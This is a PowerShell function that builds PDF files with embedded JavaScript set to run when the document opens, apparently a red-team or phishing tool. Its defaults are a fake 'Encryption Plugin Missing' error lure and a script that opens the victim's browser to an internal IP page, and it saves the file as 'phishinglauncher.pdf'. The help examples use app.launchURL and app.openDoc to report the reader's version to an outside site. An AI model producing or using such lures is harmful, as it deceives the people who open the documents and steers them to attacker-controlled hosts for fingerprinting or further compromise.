function New-PDFJS {
    <#
    .SYNOPSIS
    Generates a New PDF that includes JavaScript.
    
    .DESCRIPTION
    This function does all the heavy lifting to generate a PDF file containing JavaScript.
    
    .PARAMETER JS
    JavaScript for Adobe PDF.

    .PARAMETER MSG
    Document Title and Content String to include in PDF.

    .PARAMETER Filename
    The output filename to save the resulting document.

    .EXAMPLE 1
    > New-PDFJS 'app.alert("boom");'  "Hello PDF" "C:\PDF\boompopup.pdf"
    Generate a new PDF file that with a "boom" alertbox to C:\PDF\boompopup.pdf

    .EXAMPLE 2
    > New-PDFJS "app.launchURL('http://www.bluenotch.com/'+app.viewerVersion,true);"

    Generate a new PDF file that pops up browser to http://www.bluenotch.com/11.01 (from Acrobat Reader 11.01)

    .EXAMPLE 3
    $payload = @"
    var myURL=encodeURI("http://bluenotch.com/");app.openDoc({cPath: myURL, cFS: "CHTTP" });
"@
    > New-PDFJS "$payload" "Test openDoc" "C:\PDF\opentest.pdf"

    Generate a new PDF file that pops up browser to http://www.bluenotch.com/11.01 

    .LINK
    http://bit.ly/1BJdXY7

    #>

        [CmdletBinding()]
    Param (
        [string]$js = "app.alert('Decrypt Plugin Missing, requires Update '+app.viewerVersion);app.launchURL('http://10.10.75.99/r.html');",
        [string]$msg = "FAKE Application Error - Required Encryption Plugin Missing",
        [string]$filename = "C:\PDF\phishinglauncher.pdf"
        )


    # Use the PDFSharp-WPF.dll library
    Add-Type -Path C:\pdf\PdfSharp-WPF.dll

    $doc = New-Object PdfSharp.Pdf.PdfDocument
    $doc.Info.Title = $msg
    $doc.info.Creator = "@jimshew"
    $page = $doc.AddPage()

    $graphic = [PdfSharp.Drawing.XGraphics]::FromPdfPage($page)
    $font = New-Object PdfSharp.Drawing.XFont("Courier New", 20, [PdfSharp.Drawing.XFontStyle]::Bold)
    $box  = New-Object PdfSharp.Drawing.XRect(0,0,$page.Width, 100)
    $graphic.DrawString($msg, $font, [PdfSharp.Drawing.XBrushes]::Black, $box, [PdfSharp.Drawing.XStringFormats]::Center)

    $dictjs = New-Object PdfSharp.Pdf.PdfDictionary
    $dictjs.Elements["/S"]  = New-Object PdfSharp.Pdf.PdfName ("/JavaScript")
    $dictjs.Elements["/JS"] = New-Object PdfSharp.Pdf.PdfStringObject($doc, $js);
    $doc.Internals.AddObject($dictjs)

    $dict = New-Object PdfSharp.Pdf.PdfDictionary
    $pdfarray = New-Object PdfSharp.Pdf.PdfArray
    $embeddedstring = New-Object PdfSharp.Pdf.PdfString("EmbeddedJS")

    $dict.Elements["/Names"] = $pdfarray
    $pdfarray.Elements.Add($embeddedstring)
    $pdfarray.Elements.Add($dictjs.Reference)
    $doc.Internals.AddObject($dict)

    $dictgroup = New-Object PdfSharp.Pdf.PdfDictionary
    $dictgroup.Elements["/JavaScript"] = $dict.Reference
    $doc.Internals.Catalog.Elements["/Names"] = $dictgroup

    $doc.Save($filename)
}

